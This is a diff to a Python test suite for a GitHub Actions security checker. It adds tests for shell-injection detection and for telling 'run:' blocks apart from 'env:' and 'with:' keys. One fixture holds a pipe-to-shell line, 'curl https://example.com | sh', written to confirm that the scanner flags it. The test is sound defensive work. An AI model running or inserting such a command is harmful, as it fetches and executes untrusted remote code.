@@ -136,8 +136,6 @@ runs:
 
 class TestAnalyzeActionMetadata:
     def test_pipe_to_shell_warns(self):
-        # Multi-line run: blocks are needed — single-line run: is detected
-        # as a block start and the content is on the next line.
         action_yml = """\
 name: Test
 runs:
@@ -164,6 +162,72 @@ runs:
         with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
             warnings = analyze_action_metadata("org", "repo", "a" * 40)
         assert any("injection" in w for w in warnings)
+
+    def test_env_binding_of_input_is_not_injection(self):
+        # Real shape from carabiner-dev/actions/install/download-and-verify
+        # @60563b5, seen while reviewing apache/infrastructure-actions#1076.
+        # Binding the input to an env var and dereferencing "$INPUTS_INSTALL_DIR"
+        # inside the script is the recommended mitigation, so the `env:` block
+        # must not be scanned as if it were shell body.
+        action_yml = """\
+name: Test
+runs:
+  using: composite
+  steps:
+      - name: Validate install-dir
+        shell: bash
+        run: |
+          case "$INPUTS_INSTALL_DIR" in
+            ''|*[!A-Za-z0-9._/$~-]*)
+              echo "::error::install-dir must be non-empty; got: $INPUTS_INSTALL_DIR"
+              exit 1
+              ;;
+          esac
+        env:
+          INPUTS_INSTALL_DIR: ${{ inputs.install-dir }}
+"""
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            warnings = analyze_action_metadata("org", "repo", "a" * 40)
+        assert not any("injection" in w for w in warnings), warnings
+
+    def test_run_block_ends_at_sibling_key(self):
+        # A `run:` block scalar ends at the next key indented no deeper than
+        # `run:` itself; later steps' non-shell keys are not shell body.
+        action_yml = """\
+name: Test
+runs:
+  using: composite
+  steps:
+    - name: safe
+      run: |
+        echo hello
+      env:
+        TOKEN: ${{ inputs.token }}
+    - name: also safe
+      with:
+        path: ${{ inputs.path }}
+"""
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            warnings = analyze_action_metadata("org", "repo", "a" * 40)
+        assert not any("injection" in w for w in warnings), warnings
+
+    def test_single_line_run_is_scanned(self):
+        # The command sits on the `run:` line itself, so it has to be scanned
+        # there; nothing after it belongs to the block.
+        action_yml = """\
+name: Test
+runs:
+  using: composite
+  steps:
+    - name: dangerous
+      run: curl https://example.com | sh
+      env:
+        SAFE: ${{ inputs.name }}
+"""
+        with mock.patch("verify_action_build.security.fetch_action_yml", return_value=action_yml):
+            warnings = analyze_action_metadata("org", "repo", "a" * 40)
+        assert any("pipe-to-shell" in w for w in warnings), warnings
+        assert not any("injection" in w for w in warnings), warnings
 
     def test_clean_action_no_warnings(self):
         action_yml = """\
